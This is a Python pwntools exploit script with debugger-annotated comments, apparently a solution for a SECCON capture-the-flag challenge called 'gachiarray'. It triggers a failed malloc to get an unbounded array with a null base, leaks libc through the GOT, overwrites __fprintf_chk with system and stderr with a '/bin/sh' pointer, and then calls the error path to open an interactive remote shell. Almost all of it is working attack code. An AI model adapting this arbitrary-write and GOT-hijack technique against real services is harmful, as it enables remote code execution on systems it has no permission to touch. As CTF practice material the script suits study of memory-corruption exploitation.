#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def array_get(index): io.send(p32(1) + p32(index, signed=True) + p32(0))
def array_set(index, value): io.send(p32(2) + p32(index, signed=True) + p32(value & 0xffffffff))
def array_resize(size): io.send(p32(3) + p32(size, signed=True) + p32(0))

io = remote("gachiarray.seccon.games", 5000)

"""
pkt->capacity: -1/0xffffffff

(int*)malloc(pkt->capacity * 4) :

0x4013fe <array_init+30>    call   malloc@plt                  <malloc@plt>
   size: 0xfffffffffffffffc

pwndbg> ni
...SNIP...
pwndbg> p $rax
$1 = 0

as, pkt->size = 0 
it  will skip the initialization

pwndbg> dq &g_array 
0000000000404070     ffffffff00000000 0000000000000000
0000000000404080     0000000000000000 0000000000000000
0000000000404090     0000000000000000 0000000000000000
00000000004040a0     0000000000000000 0000000000000000

g_array->capacity = 0xffffffff
g_array->size     = 0
g_array->initial  = 0
g_array->data     = 0    (because malloc failed)
"""

io.send(p32(-1, signed=True) + p32(0) + p32(0))


"""
as pkt.size == -1 which is never greater than g_array.size so, there is no initialization:

for (int i = g_array.size; i < pkt.size; i++)
     g_array.data[i] = g_array.initial;

after the resize:
pwndbg> dq &g_array 
0000000000404070     ffffffffffffffff 0000000000000000
0000000000404080     0000000000000000 0000000000000000
0000000000404090     0000000000000000 0000000000000000
00000000004040a0     0000000000000000 0000000000000000

g_array->capacity = 0xffffffff
g_array->size     = 0xffffffff
g_array->initial  = 0
g_array->data     = 0    (because malloc failed)
"""
array_resize(-1)

"""
now whatever we give as index will be multiplied by four and will be used as addr
as the g_array->size == 0xffffffff so, we can use almost any 32 bit addr 
because pie is not enabled this allows us to overwrite and read anything
"""

"""
read exe.got.read in two parts ... first the lower 32 bits and the the upper 32 bits
this gives us the libc base

overwrite the __fprintf_chk to system & stderr to ptr to /bin/sh\x00
array_get(-1) results in this brach:

case 1:
  if (g_array.size <= pkt.index)
    fatal("Out-of-bounds");
  printf("array[%d] = %d\n", pkt.index, g_array.data[pkt.index]);
  break;

fatal() calls __fprintf_chk with rdi set to stderr which we overwrote to ptr to /bin/sh\x00

void fatal(const char *msg) {
  fprintf(stderr, "[ERROR] %s\n", msg);
  exit(1);
}

so, it calls system("/bin/sh\x00")
"""
array_get(exe.got.read//4) ; array_get((exe.got.read+4)//4)
io.recvline() ; io.recvline()
low  = int(io.recvline().strip().split(b' = ')[1]) & 0xFFFFFFFF
high = int(io.recvline().strip().split(b' = ')[1]) & 0xFFFFFFFF
libc.address = (low | (high << 32)) - libc.sym.read

array_set(exe.got.__fprintf_chk//4, libc.sym.system & 0xFFFFFFFF)
array_set((exe.got.__fprintf_chk+4)//4, (libc.sym.system >> 32) & 0xFFFFFFFF)
array_set(0x404060//4, (libc.address + 0x1cb42f) & 0xFFFFFFFF) ; array_set((0x404060+4)//4, ((libc.address + 0x1cb42f) >> 32) & 0xFFFFFFFF)

array_get(-1)
io.interactive()

